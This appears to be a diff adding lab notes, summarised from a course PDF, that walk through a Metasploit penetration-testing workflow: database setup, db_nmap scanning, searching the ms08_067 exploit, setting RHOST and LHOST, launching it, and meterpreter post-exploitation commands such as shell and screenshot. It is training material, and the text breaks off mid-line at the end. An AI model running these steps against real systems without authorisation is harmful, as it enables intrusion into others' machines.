@@ -1,0 +1,56 @@
+#####Set VM network to Bridged for Kali and target VMs (GUI: Player → Manage → Virtual Machine Settings → Network Adapter → Bridged). (PDF instructs this; no single command). 
+
+
+
+Start PostgreSQL:
+
+sudo systemctl start postgresql.service                  # (from PDF)
+# optionally: sudo systemctl enable postgresql.service
+
+
+########Initialize Metasploit DB (recommended inference — PDF references DB init but exact line omitted):
+
+sudo msfdb init                                         # (recommended; PDF references db init)
+
+
+####Start Metasploit console:
+
+sudo msfconsole                                         # (from PDF)
+
+
+####Use db_nmap from msfconsole to import scan results:
+
+# inside msfconsole prompt:
+db_nmap <target-ip>                                     # (from PDF)
+services                                                # list services (from PDF)
+
+
+#######Search for an exploit (example given in PDF):
+
+search ms08_067                                         # (from PDF example)
+info exploit/windows/some/path                          # use info to read exploit details (recommended)
+
+
+######Set exploit options and run exploit (example pattern):
+
+set RHOST <target-ip>
+set LHOST <your-attacker-ip>
+set RPORT <port-if-required>
+exploit                                                 # launch exploit
+
+
+#########Post-exploit / meterpreter commands (from PDF):
+
+shell                                                   # drop to target shell (from PDF)
+ipconfig                                                # run on target shell (from PDF)
+dir                                                     # list directories (from PDF)
+ps                                                      # list processes (from PDF)
+screenshot                                              # take screenshot (meterpreter) (from PDF)
+exit                                                    # exit shell/meterpreter (from PDF)
+
+
+To save scan outputs (as PDF described): use -oN or Metasploit saved folder (msf4 local). Example:
+
+# outside msfconsole:
+db_nmap -oN msf_scan.txt <target-ip>                    # recommended
+# inside msfconsole, saved results go to ~/.msf4/loot or /root/.msf4/local/ (PDF men
